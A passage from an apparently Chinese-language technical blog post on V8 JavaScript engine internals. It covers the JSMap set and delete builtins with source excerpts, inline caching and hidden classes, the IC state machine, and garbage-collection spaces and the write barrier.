<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Walk the bucket chain.</span></span><br><span class="line"> TNode&lt;IntPtrT&gt; entry_start;</span><br><span class="line"> <span class="function">Label <span class="title">if_key_found</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="built_in">TVARIABLE</span>(IntPtrT, var_entry, first_entry);</span><br><span class="line">   <span class="function">Label <span class="title">loop</span><span class="params">(<span class="keyword">this</span>, &#123;&amp;var_entry, entry_start_position&#125;)</span>,</span></span><br><span class="line"><span class="function">       <span class="title">continue_next_entry</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">   <span class="built_in">Goto</span>(&amp;loop);</span><br><span class="line">   <span class="built_in">BIND</span>(&amp;loop);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// If the entry index is the not-found sentinel, we are done.</span></span><br><span class="line">   <span class="built_in">GotoIf</span>(<span class="built_in">IntPtrEqual</span>(var_entry.<span class="built_in">value</span>(),</span><br><span class="line">                      <span class="built_in">IntPtrConstant</span>(CollectionType::kNotFound)),</span><br><span class="line">          not_found);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Make sure the entry index is within range.</span></span><br><span class="line">   <span class="built_in">CSA_ASSERT</span>(</span><br><span class="line">       <span class="keyword">this</span>,</span><br><span class="line">       <span class="built_in">UintPtrLessThan</span>(</span><br><span class="line">           var_entry.<span class="built_in">value</span>(),</span><br><span class="line">           <span class="built_in">SmiUntag</span>(<span class="built_in">SmiAdd</span>(</span><br><span class="line">               <span class="built_in">CAST</span>(<span class="built_in">UnsafeLoadFixedArrayElement</span>(</span><br><span class="line">                   table, CollectionType::<span class="built_in">NumberOfElementsIndex</span>())),</span><br><span class="line">               <span class="built_in">CAST</span>(<span class="built_in">UnsafeLoadFixedArrayElement</span>(</span><br><span class="line">                   table, CollectionType::<span class="built_in">NumberOfDeletedElementsIndex</span>()))))));</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Compute the index of the entry relative to kHashTableStartIndex.</span></span><br><span class="line">   entry_start =</span><br><span class="line">       <span class="built_in">IntPtrAdd</span>(<span class="built_in">IntPtrMul</span>(var_entry.<span class="built_in">value</span>(),</span><br><span class="line">                           <span class="built_in">IntPtrConstant</span>(CollectionType::kEntrySize)),</span><br><span class="line">                 number_of_buckets);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Load the key from the entry.</span></span><br><span class="line">   <span class="type">const</span> TNode&lt;Object&gt; candidate_key = <span class="built_in">UnsafeLoadFixedArrayElement</span>(</span><br><span class="line">       table, entry_start,</span><br><span class="line">       CollectionType::<span class="built_in">HashTableStartIndex</span>() * kTaggedSize);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">key_compare</span>(candidate_key, &amp;if_key_found, &amp;continue_next_entry);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">BIND</span>(&amp;continue_next_entry);</span><br><span class="line">   <span class="comment">// Load the index of the next entry in the bucket chain.</span></span><br><span class="line">   var_entry = <span class="built_in">SmiUntag</span>(<span class="built_in">CAST</span>(<span class="built_in">UnsafeLoadFixedArrayElement</span>(</span><br><span class="line">       table, entry_start,</span><br><span class="line">       (CollectionType::<span class="built_in">HashTableStartIndex</span>() + CollectionType::kChainOffset) *</span><br><span class="line">           kTaggedSize)));</span><br><span class="line"></span><br><span class="line">   <span class="built_in">Goto</span>(&amp;loop);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">BIND</span>(&amp;if_key_found);</span><br><span class="line"> *entry_start_position = entry_start;</span><br><span class="line"> <span class="built_in">Goto</span>(entry_found);</span><br></pre></td></tr></table></figure></div>

<p>如果在 <code>Map</code> 中已经存在待加入的 <code>key</code> 了，则调用 <code>StoreFixedArrayElement</code> 更新 <code>Entry</code> 中的 <code>value</code> ，这里的 <code>entry_start_position_or_hash</code> 即前面 <code>TryLookupOrderedHashTableIndex</code> 找到的 <code>Entry</code> 在 <code>elements</code> 中的下标（实际上是相当于 <code>table</code> 的偏移）。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">BIND</span>(&amp;entry_found);</span><br><span class="line"><span class="comment">// If we found the entry, we just store the value there.</span></span><br><span class="line"><span class="built_in">StoreFixedArrayElement</span>(table, entry_start_position_or_hash.<span class="built_in">value</span>(), value,</span><br><span class="line">                       UPDATE_WRITE_BARRIER,</span><br><span class="line">                       kTaggedSize * (OrderedHashMap::<span class="built_in">HashTableStartIndex</span>() +</span><br><span class="line">                                      OrderedHashMap::kValueOffset));</span><br><span class="line"><span class="built_in">Return</span>(receiver);</span><br></pre></td></tr></table></figure></div>

<p>之后特判了 <code>entry_start_position_or_hash</code> 不是 hash code 的情况（？？）</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Label <span class="title">no_hash</span><span class="params">(<span class="keyword">this</span>)</span>, <span class="title">add_entry</span><span class="params">(<span class="keyword">this</span>)</span>, <span class="title">store_new_entry</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line"><span class="built_in">BIND</span>(&amp;not_found);</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// If we have a hash code, we can start adding the new entry.</span></span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">IntPtrGreaterThan</span>(entry_start_position_or_hash.<span class="built_in">value</span>(),</span><br><span class="line">                           <span class="built_in">IntPtrConstant</span>(<span class="number">0</span>)),</span><br><span class="line">         &amp;add_entry);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Otherwise, go to runtime to compute the hash code.</span></span><br><span class="line">  entry_start_position_or_hash = <span class="built_in">SmiUntag</span>(<span class="built_in">CallGetOrCreateHashRaw</span>(<span class="built_in">CAST</span>(key)));</span><br><span class="line">  <span class="built_in">Goto</span>(&amp;add_entry);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后判断是否满足 <code>elements + deletes &lt; buckets &lt;&lt; 1</code> ，如果不满足则增加 <code>Map</code> 的容量。这就是为什么调试的时候 <code>OrderedHashMap</code> 的位置一直在变。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">BIND</span>(&amp;add_entry);</span><br><span class="line"><span class="built_in">TVARIABLE</span>(IntPtrT, number_of_buckets);</span><br><span class="line"><span class="built_in">TVARIABLE</span>(IntPtrT, occupancy);</span><br><span class="line"><span class="built_in">TVARIABLE</span>(OrderedHashMap, table_var, table);</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// Check we have enough space for the entry.</span></span><br><span class="line">  number_of_buckets = <span class="built_in">SmiUntag</span>(<span class="built_in">CAST</span>(<span class="built_in">UnsafeLoadFixedArrayElement</span>(</span><br><span class="line">      table, OrderedHashMap::<span class="built_in">NumberOfBucketsIndex</span>())));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">STATIC_ASSERT</span>(OrderedHashMap::kLoadFactor == <span class="number">2</span>);</span><br><span class="line">  <span class="type">const</span> TNode&lt;WordT&gt; capacity = <span class="built_in">WordShl</span>(number_of_buckets.<span class="built_in">value</span>(), <span class="number">1</span>);</span><br><span class="line">  <span class="type">const</span> TNode&lt;IntPtrT&gt; number_of_elements = <span class="built_in">SmiUntag</span>(</span><br><span class="line">      <span class="built_in">CAST</span>(<span class="built_in">LoadObjectField</span>(table, OrderedHashMap::<span class="built_in">NumberOfElementsOffset</span>())));</span><br><span class="line">  <span class="type">const</span> TNode&lt;IntPtrT&gt; number_of_deleted = <span class="built_in">SmiUntag</span>(<span class="built_in">CAST</span>(<span class="built_in">LoadObjectField</span>(</span><br><span class="line">      table, OrderedHashMap::<span class="built_in">NumberOfDeletedElementsOffset</span>())));</span><br><span class="line">  occupancy = <span class="built_in">IntPtrAdd</span>(number_of_elements, number_of_deleted);</span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">IntPtrLessThan</span>(occupancy.<span class="built_in">value</span>(), capacity), &amp;store_new_entry);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// We do not have enough space, grow the table and reload the relevant</span></span><br><span class="line">  <span class="comment">// fields.</span></span><br><span class="line">  <span class="built_in">CallRuntime</span>(Runtime::kMapGrow, context, receiver);</span><br><span class="line">  table_var =</span><br><span class="line">      <span class="built_in">LoadObjectField</span>&lt;OrderedHashMap&gt;(<span class="built_in">CAST</span>(receiver), JSMap::kTableOffset);</span><br><span class="line">  number_of_buckets = <span class="built_in">SmiUntag</span>(<span class="built_in">CAST</span>(<span class="built_in">UnsafeLoadFixedArrayElement</span>(</span><br><span class="line">      table_var.<span class="built_in">value</span>(), OrderedHashMap::<span class="built_in">NumberOfBucketsIndex</span>())));</span><br><span class="line">  <span class="type">const</span> TNode&lt;IntPtrT&gt; new_number_of_elements = <span class="built_in">SmiUntag</span>(<span class="built_in">CAST</span>(<span class="built_in">LoadObjectField</span>(</span><br><span class="line">      table_var.<span class="built_in">value</span>(), OrderedHashMap::<span class="built_in">NumberOfElementsOffset</span>())));</span><br><span class="line">  <span class="type">const</span> TNode&lt;IntPtrT&gt; new_number_of_deleted = <span class="built_in">SmiUntag</span>(<span class="built_in">CAST</span>(<span class="built_in">LoadObjectField</span>(</span><br><span class="line">      table_var.<span class="built_in">value</span>(), OrderedHashMap::<span class="built_in">NumberOfDeletedElementsOffset</span>())));</span><br><span class="line">  occupancy = <span class="built_in">IntPtrAdd</span>(new_number_of_elements, new_number_of_deleted);</span><br><span class="line">  <span class="built_in">Goto</span>(&amp;store_new_entry);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后调用 <code>StoreOrderedHashMapNewEntry</code> 将新的 <code>Entry</code> 添加到 <code>elements</code> 中。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">BIND</span>(&amp;store_new_entry);</span><br><span class="line"><span class="comment">// Store the key, value and connect the element to the bucket chain.</span></span><br><span class="line"><span class="built_in">StoreOrderedHashMapNewEntry</span>(table_var.<span class="built_in">value</span>(), key, value,</span><br><span class="line">                            entry_start_position_or_hash.<span class="built_in">value</span>(),</span><br><span class="line">                            number_of_buckets.<span class="built_in">value</span>(), occupancy.<span class="built_in">value</span>());</span><br><span class="line"><span class="built_in">Return</span>(receiver);</span><br></pre></td></tr></table></figure></div>

<p><code>StoreOrderedHashMapNewEntry</code> 的函数接口如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CollectionsBuiltinsAssembler::StoreOrderedHashMapNewEntry</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> TNode&lt;OrderedHashMap&gt; table, <span class="type">const</span> TNode&lt;Object&gt; key,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> TNode&lt;Object&gt; value, <span class="type">const</span> TNode&lt;IntPtrT&gt; hash,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> TNode&lt;IntPtrT&gt; number_of_buckets, <span class="type">const</span> TNode&lt;IntPtrT&gt; occupancy)</span></span></span><br></pre></td></tr></table></figure></div>

<p>首先计算出将要添加的 <code>Entry</code> 的位置，这里获取的 <code>entry_start</code> 是相对于 <code>HashTable</code> 的偏移。 </p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> TNode&lt;IntPtrT&gt; entry_start = <span class="built_in">IntPtrAdd</span>(</span><br><span class="line">    <span class="built_in">IntPtrMul</span>(occupancy, <span class="built_in">IntPtrConstant</span>(OrderedHashMap::kEntrySize)),</span><br><span class="line">    number_of_buckets);</span><br></pre></td></tr></table></figure></div>

<p>之后依次写入 <code>key</code> ，<code>value</code> ，<code>bucket_entry</code> ，即整个 <code>Entry</code> 的结构。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">UnsafeStoreFixedArrayElement</span>(</span><br><span class="line">    table, entry_start, key, UPDATE_WRITE_BARRIER,</span><br><span class="line">    kTaggedSize * OrderedHashMap::<span class="built_in">HashTableStartIndex</span>());</span><br><span class="line"><span class="built_in">UnsafeStoreFixedArrayElement</span>(</span><br><span class="line">    table, entry_start, value, UPDATE_WRITE_BARRIER,</span><br><span class="line">    kTaggedSize * (OrderedHashMap::<span class="built_in">HashTableStartIndex</span>() +</span><br><span class="line">                   OrderedHashMap::kValueOffset));</span><br><span class="line"><span class="built_in">UnsafeStoreFixedArrayElement</span>(</span><br><span class="line">    table, entry_start, bucket_entry,</span><br><span class="line">    kTaggedSize * (OrderedHashMap::<span class="built_in">HashTableStartIndex</span>() +</span><br><span class="line">                   OrderedHashMap::kChainOffset));</span><br></pre></td></tr></table></figure></div>

<p>之后更新 <code>bucket</code> 和 <code>number of elements</code> 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Update the bucket head.</span></span><br><span class="line"><span class="built_in">UnsafeStoreFixedArrayElement</span>(</span><br><span class="line">    table, bucket, <span class="built_in">SmiTag</span>(occupancy),</span><br><span class="line">    OrderedHashMap::<span class="built_in">HashTableStartIndex</span>() * kTaggedSize);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Bump the elements count.</span></span><br><span class="line"><span class="type">const</span> TNode&lt;Smi&gt; number_of_elements =</span><br><span class="line">    <span class="built_in">CAST</span>(<span class="built_in">LoadObjectField</span>(table, OrderedHashMap::<span class="built_in">NumberOfElementsOffset</span>()));</span><br><span class="line"><span class="built_in">StoreObjectFieldNoWriteBarrier</span>(table,</span><br><span class="line">                               OrderedHashMap::<span class="built_in">NumberOfElementsOffset</span>(),</span><br><span class="line">                               <span class="built_in">SmiAdd</span>(number_of_elements, <span class="built_in">SmiConstant</span>(<span class="number">1</span>)));</span><br></pre></td></tr></table></figure></div>



<h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><p><code>delete(key)</code> 是 <code>JSMap</code> 中用来删除键值对的方法，具体接口定义如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">TF_BUILTIN</span>(MapPrototypeDelete, CollectionsBuiltinsAssembler) </span><br></pre></td></tr></table></figure></div>

<p>首先 <code>TryLookupOrderedHashTableIndex</code> 查找 <code>key</code> 对应的 <code>Entry</code> ，这个的具体实现前面的 <code>set</code> 已经提到过了。 </p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">TryLookupOrderedHashTableIndex</span>&lt;OrderedHashMap&gt;(</span><br><span class="line">    table, key, &amp;entry_start_position_or_hash, &amp;entry_found, &amp;not_found);</span><br></pre></td></tr></table></figure></div>

<p>如果没有找到则返回 <code>False</code> 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">BIND</span>(&amp;not_found);</span><br><span class="line"><span class="built_in">Return</span>(<span class="built_in">FalseConstant</span>());</span><br></pre></td></tr></table></figure></div>

<p>如果找到了 <code>Entry</code> 就将 <code>Entry</code> 中的 <code>key</code> 和 <code>value</code> 修改为 <code>Hole</code> 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">BIND</span>(&amp;entry_found);</span><br><span class="line"><span class="comment">// If we found the entry, mark the entry as deleted.</span></span><br><span class="line"><span class="built_in">StoreFixedArrayElement</span>(table, entry_start_position_or_hash.<span class="built_in">value</span>(),</span><br><span class="line">                       <span class="built_in">TheHoleConstant</span>(), UPDATE_WRITE_BARRIER,</span><br><span class="line">                       kTaggedSize * OrderedHashMap::<span class="built_in">HashTableStartIndex</span>());</span><br><span class="line"><span class="built_in">StoreFixedArrayElement</span>(table, entry_start_position_or_hash.<span class="built_in">value</span>(),</span><br><span class="line">                       <span class="built_in">TheHoleConstant</span>(), UPDATE_WRITE_BARRIER,</span><br><span class="line">                       kTaggedSize * (OrderedHashMap::<span class="built_in">HashTableStartIndex</span>() +</span><br><span class="line">                                      OrderedHashMap::kValueOffset));</span><br></pre></td></tr></table></figure></div>

<p>之后将 <code>number_of_elements</code> 减一，<code>number_of_deleted</code> 加一。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Decrement the number of elements, increment the number of deleted elements.</span></span><br><span class="line"> <span class="type">const</span> TNode&lt;Smi&gt; number_of_elements = <span class="built_in">SmiSub</span>(</span><br><span class="line">     <span class="built_in">CAST</span>(<span class="built_in">LoadObjectField</span>(table, OrderedHashMap::<span class="built_in">NumberOfElementsOffset</span>())),</span><br><span class="line">     <span class="built_in">SmiConstant</span>(<span class="number">1</span>));</span><br><span class="line"> <span class="built_in">StoreObjectFieldNoWriteBarrier</span>(</span><br><span class="line">     table, OrderedHashMap::<span class="built_in">NumberOfElementsOffset</span>(), number_of_elements);</span><br><span class="line"> <span class="type">const</span> TNode&lt;Smi&gt; number_of_deleted =</span><br><span class="line">     <span class="built_in">SmiAdd</span>(<span class="built_in">CAST</span>(<span class="built_in">LoadObjectField</span>(</span><br><span class="line">                table, OrderedHashMap::<span class="built_in">NumberOfDeletedElementsOffset</span>())),</span><br><span class="line">            <span class="built_in">SmiConstant</span>(<span class="number">1</span>));</span><br><span class="line"> <span class="built_in">StoreObjectFieldNoWriteBarrier</span>(</span><br><span class="line">     table, OrderedHashMap::<span class="built_in">NumberOfDeletedElementsOffset</span>(),</span><br><span class="line">     number_of_deleted);</span><br></pre></td></tr></table></figure></div>

<p>之后判断是否满足 <code>number_of_elements + number_of_elements &lt; number_of_buckets</code> 则调用 <code>shrink</code> 将 <code>elements</code> 中的 <code>Hole</code> 清除。最后返回 <code>True</code> 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> TNode&lt;Smi&gt; number_of_buckets = <span class="built_in">CAST</span>(</span><br><span class="line">    <span class="built_in">LoadFixedArrayElement</span>(table, OrderedHashMap::<span class="built_in">NumberOfBucketsIndex</span>()));</span><br><span class="line"></span><br><span class="line"><span class="comment">// If there fewer elements than #buckets / 2, shrink the table.</span></span><br><span class="line"><span class="function">Label <span class="title">shrink</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line"><span class="built_in">GotoIf</span>(<span class="built_in">SmiLessThan</span>(<span class="built_in">SmiAdd</span>(number_of_elements, number_of_elements),</span><br><span class="line">                   number_of_buckets),</span><br><span class="line">       &amp;shrink);</span><br><span class="line"><span class="built_in">Return</span>(<span class="built_in">TrueConstant</span>());</span><br><span class="line"></span><br><span class="line"><span class="built_in">BIND</span>(&amp;shrink);</span><br><span class="line"><span class="built_in">CallRuntime</span>(Runtime::kMapShrink, context, receiver);</span><br><span class="line"><span class="built_in">Return</span>(<span class="built_in">TrueConstant</span>());</span><br></pre></td></tr></table></figure></div>
<h1 id="Inline-Cache"><a href="#Inline-Cache" class="headerlink" title="Inline Cache"></a>Inline Cache</h1><p><a class="link"   href="https://v8.github.io/tools/v7.6/ic-explorer.html" >分析网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>对于确定的 map，我们可以知道 name property 所存储在 properties array 的位置。如果我们经过 JIT 生成的汇编里，<strong>函数</strong>所访问的 obj 的 map ，总是被我们缓存（cache) 的 map ，那么我们访问的 obj.X 的偏移永远是固定的。由此我们可以直接从 properties array 的固定偏移处取出我们想要的值 obj.X ，而不需要重新根据 map 检索 obj.X 所对应的偏移，从而可以加速。</p>
<h2 id="对象的隐藏类（Hidden-Class）"><a href="#对象的隐藏类（Hidden-Class）" class="headerlink" title="对象的隐藏类（Hidden Class）"></a>对象的隐藏类（Hidden Class）</h2><p>由于 JavaScript 对象没有类型信息，几乎所有 JS 引擎都采用隐藏类（Hidden Class&#x2F;Shape&#x2F;Map等）来描述对象的布局信息，用以在虚拟机内部区分不同对象的类型，从而完成一些基于类型的优化。</p>
<p>V8 对 JavaScript 对象都使用 HeapObject 来描述和存储，每一种 JavaScript 对象都是 HeapObject 的子类，而每个 HeapObject 都用 Map 来描述对象的布局。对象的 Map 描述了对象的类型，即成员数目、成员名称、成员在内存中的位置信息等。</p>
<h2 id="隐藏类变迁（Map-Transition）"><a href="#隐藏类变迁（Map-Transition）" class="headerlink" title="隐藏类变迁（Map Transition）"></a>隐藏类变迁（Map Transition）</h2><p>因为JavaScript是高度动态的程序设计语言，对象的成员可以被随意动态地添加、删除甚至修改类型。因此，对象的隐藏类在程序的运行过程中可能会发生变化，V8内部把这种变化叫隐藏类变迁（Map Transition）。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/1d41626cf74c223f3665480fbbf112b0.png"
                      alt="在这里插入图片描述"
                ></p>
<h2 id="类型反馈向量（type-feedback-vector）"><a href="#类型反馈向量（type-feedback-vector）" class="headerlink" title="类型反馈向量（type feedback vector）"></a>类型反馈向量（type feedback vector）</h2><p>对于某代码语句比如 <code>this.x=x</code> ，比较上次执行到该语句时缓存的 Map 和对象当前的 Map 是否相同，如果相同则执行对应的 IC-Hit 代码，反之执行 IC-Miss 代码。V8 会在 Point 函数对象上添加一个名 <code>type_feedback_vector</code> 的数组成员，对于该函数中的每处可能产生 IC 的代码，Point 对象中的 <code>type_feedback_vector</code> 会缓存上一次执行至该语句时对象的 Map 和对应的 IC-Hit 代码（在 V8 内部称为 IC-Hit Handler ）。简单来说，<code>type_feedback_vector</code> 缓存了 Map 和与之对应的 IC-Hit handler ，这样 IC 相关的逻辑简化为只需要通过访问 <code>type_feedback_vector</code> 就可以判断是否 IC Hit 并执行对应的 IC-Hit Handler 。</p>
<h2 id="IC状态机"><a href="#IC状态机" class="headerlink" title="IC状态机"></a>IC状态机</h2><p>为了描述 V8 中 IC 状态的变化情况，本节将以状态机的形式描述 V8 中最常见 IC 种类的状态变化情况。V8 中最常用的 IC 分为五个状态，如图所示，初始为 uninitialized 状态，当发生一次 IC-Miss 时会变为 pre-monomorphic 态，再次 IC-Miss 会进入 monomorphic 态，如果继续 IC-Miss ，则会进入 polymorphic 状态。进入 polymorphic 之后如果继续 IC-Miss 3 次，则会进入megamorphic 态，并最终稳定在 megamophic 态。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/e43ddd56d83ee56c3634e855f189d296.png"
                      alt="在这里插入图片描述"
                ></p>
<ul>
<li>初始为 uninitialized 状态，当发生一次 IC-Miss 时（由于 <code>type_feedback_vector</code> 为空，一定会 IC-Miss）会变为 pre-monomorphic 态。IC-Miss Handler 会分析出此时 obj 的 Map 中不包含添加的属性，因此会添加新成员，接着会发生 Map Transition 。由于考虑到大部分函数可能只会被调用一次，因此 V8 的策略是发生第一次 IC-Miss 时，并不会缓存此时的 map ，也不会产生 IC-Hit handler 。</li>
<li>再次 IC-Miss 会进入 monomorphic 态。由于 <code>type_feedback_vector</code> 仍然为空，因此会发生第二次 IC-Miss ，并将IC状态修改为 monomorphic ，此次 IC-Miss Hanlder 除了发生 Map Transition 之外，还会编译生成 IC-Hit Handler ，并将 map 和 IC Hit Handler 缓存到 <code>type_feedback_vector</code> 中。由于此次 IC-Miss Handler 需要编译 IC-Hit Handler 的操作比较耗时，因此第二次执行是最慢的。</li>
<li>第三次如果和上一次属性相同则 <code>type_feedback_vector</code> 不为空，且此时缓存的 map 与此时 obj 的 Map 也是一致的，因此会直接调用 IC-Hit Handler 来添加成员并进行 Map transition 。由于此次无需对 map 进行分析，也无需编译 IC-Hit Handler ，因此此时执行效率比前两次都高。</li>
<li>在 polymorphic 态 IC-Hit 时，需要对缓存进行线性查找。</li>
<li>IC状态太多比如到达 megamorphic 态，此时 Map 和 IC-Hit Handler 便不会再缓存在 obj 的 <code>type_feedback_vector</code> 中，而是存储在固定大小的全局 hashtable 中，如果 IC 态多于 hashtable 的大小，则会对之前的缓存进行覆盖。Megamorphic 是性能最低的 IC-Hit ，因为需要每次对 hashtable 进行查找，但是 megamorphic ic hit 性能仍然优于 IC-Miss 。</li>
</ul>
<h1 id="GC"><a href="#GC" class="headerlink" title="GC"></a>GC</h1><p>垃圾回收是⼀种在 V8 中单独管理 JavaScript 对象（称为 HeapObject ）的机制，其功能是检测废弃的对象并⾃动释放它们。</p>
<h2 id="GC-的空间划分"><a href="#GC-的空间划分" class="headerlink" title="GC 的空间划分"></a>GC 的空间划分</h2><p>GC 有两种主要的 Generation 。根据存活时间分为 Young 和 Old Generation 。除此之外，还有⼀些区域不属于任何⼀个 Generation ，它被写为 Other ，但是其实是 Large Object Space 。在源代码中，有些地方包含 Old Generation 的 large object space 的描述，但是基本上认为它们是不同的东西。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/7b4e56651bde606a62ddf04a9ee02d08.png"
                      alt="在这里插入图片描述"
                ></p>
<h2 id="Yong-Generation"><a href="#Yong-Generation" class="headerlink" title="Yong Generation"></a>Yong Generation</h2><h3 id="New-Space"><a href="#New-Space" class="headerlink" title="New Space"></a>New Space</h3><p>新创建的 object 除了code object，map object 和 large object 外都被保留在这里，并且受到 GC 管理。</p>
<p>GC 使用的算法是 Cheney’s algorithm ，在源码里被称为 Scavenge 。为了使用这种算法将 Young Generation 分为 From Space 和 To Space 两个区域。</p>
<h3 id="Cheney’s-algorithm"><a href="#Cheney’s-algorithm" class="headerlink" title="Cheney’s algorithm"></a>Cheney’s algorithm</h3><p>每⼀个对象最开始被放到 To Space 。</p>
<p>当 memory exhaustion（空间用完）时候，GC 被调用。主线程的操作( Javascript 执行的线程)被暂停。交换To Space 和 From Space 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/bd2fa5cad07aa2c49e840d27a3d06d3e.png"
                      alt="在这里插入图片描述"
                ><br>之后会把存活的对象复制到 To Space ，然后再次分配之前未分配完成的 obj-e 。这里判断存活 obj 的方法是从各种各样的 root objects (例如 global objects, built-in objects, local objects within the scope of living 等）和从 Old Space 可以访问的 object (Write Barrier mechanism）沿指针遍历出所有存活的 obj 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/e1557fa97f7e301249cd965b402054f1.png"
                      alt="在这里插入图片描述"
                ><br>之后，每次GC发生时，都会重复上面这⼀系列的流程。</p>
<h2 id="Old-Generation"><a href="#Old-Generation" class="headerlink" title="Old Generation"></a>Old Generation</h2><h3 id="old-space"><a href="#old-space" class="headerlink" title="old space"></a>old space</h3><p>长期存活对象存放的区域，例如 New Space 中，在两次 GC 之后存活下来的 object ，具体参考 <code>Heap::ShouldBePromoted()</code> 。</p>
<p>old space 发生 GC 的频率比 new space 少，因此如果⼀个 object 被移动到 old space ，该 object 不会受到 GC 更改 layout 的影响。</p>
<h3 id="code-space"><a href="#code-space" class="headerlink" title="code space"></a>code space</h3><p>仅适用于 JIT 的 code object ，由于 code object 是 RWX ，因此它从一开始就保留在此区域中，由于它是JIT代码，因此不仅要读取（R）写⼊（W），还要执行（X），因此 memory permissions 与其他的地方不同。</p>
<h3 id="map-space"><a href="#map-space" class="headerlink" title="map space"></a>map space</h3><p>仅存放 Map object ，出于 GC 效率的考虑，Map object 从一开始就位于此区域。</p>
<h3 id="Mark-Sweep-Compact"><a href="#Mark-Sweep-Compact" class="headerlink" title="Mark-Sweep-Compact"></a>Mark-Sweep-Compact</h3><p>old generation 的 GC 算法是 Mark-Sweep-Compact ，即标记-清除-整理算法。</p>
<h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><p>即 Large Object Space ，用于存放 600KB 或更大的 object 的区域。它由 mmap 直接分配，如果有多个存放区域，则使用链表进行管理。它不在GC中移动。</p>
<h2 id="Write-Barrier"><a href="#Write-Barrier" class="headerlink" title="Write Barrier"></a>Write Barrier</h2><p>写屏障是⼀种减少时间开销的机制。</p>
<p>当 GC 想回收新生代中的内容的时候，如果此时有一个对象，且这个对象恰好被一个老年代所引用，那么这个时候，如果想回收这个对象，就需要去遍历老年代，这样开销比较大。</p>
<p>所以就引入了记录集，在更新对象的时候有个记录集，这个记录集内记录了所有老年代指向新生代的情况，即记录集里保存的实际上是指向老年代对象的指针。</p>
<p>在新生代中触发 GC 的时候，会将记录集里的老年代对象也当成根对象⼀样，扫描记录集，查看记录集里老年代对象引用的目标对象，进而更新引用的目标对象，再将发出引用的对象的指针更新到目标空间了。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/7d32f6a090435f50b55c8bd2e7a8968d.png"
                      alt="在这里插入图片描述"
                ><br>在分代垃圾回收中，为了将老年代对象记录到记录集⾥，我们引⼊了写入屏障（write barrier）的概念。<br>在更新对象间的指针时候检查如下三点：</p>
<ul>
<li>发出引用的对象是不是老年代对象</li>
<li>指针更新后的引用的目标对象是不是新生代对象</li>
<li>发出引用的对象是否还没有被记录到记录集中</li>
</ul>
<p>如果这些条件都满足，就将老年代对象 obj 写入到记录集里。</p>
